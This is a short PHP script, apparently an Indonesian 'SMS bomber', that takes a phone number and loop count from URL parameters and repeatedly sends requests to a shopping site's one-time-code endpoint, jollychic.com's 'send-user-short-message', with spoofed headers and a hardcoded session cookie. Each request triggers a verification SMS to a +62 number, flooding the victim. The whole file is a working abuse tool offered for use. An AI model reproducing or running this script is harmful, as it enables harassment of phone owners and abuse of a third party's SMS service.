
<?php


if(!$_GET['no']){ 
echo "Hanya Sebuah Sabunku ";
}else{
$loop = $_GET['loop'];
$no = $_GET['no'];
            $header = array(
            'Host: id.m.jollychic.com:443',
            'Connection: keep-alive',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36',
            'Origin: https://hangouts.google.com',
            'Content-Type: application/x-www-form-urlencoded',
            'Referer: https://hangouts.google.com',
            'Cookie: __cfduid=d55ff1c058aea6554a9518cd5ec89e8221527302450; Users=7fde1c5c41d9b5e55aafb1960250e3b6; __uid=0; BI_Cart=15273024697095; country_code=ID; jollychiczoneip=1; countrySizeType=%7B%22size_type%22%3A21%2C%22size_type_name%22%3A%22US%22%7D; language=%7B%22name%22%3A%22id%22%2C%22code%22%3A12%7D; LANG_NAME=id; LANG_CODE=12; Ucart=1527302469569',
            'Accept-Encoding: gzip, deflate, br',
            'Accept-Language: en-US,en;q=0.9',
            'Cache-Control: max-age=0',);
    function http($postdata){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://id.m.jollychic.com/oauth/send-user-short-message');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_VERBOSE, false);
        if(!empty($postdata)){
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
        }
        $response = curl_exec($ch);
        $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        return array($http, $response);
    }
    for ($x = 0;$x <= $loop ;$x++) {
    http("useType=phoneLogin&countryNumber=62&phone=".$no.""); 
    echo "SMS ke +62".$no." Sukses<br>";
}
}

?>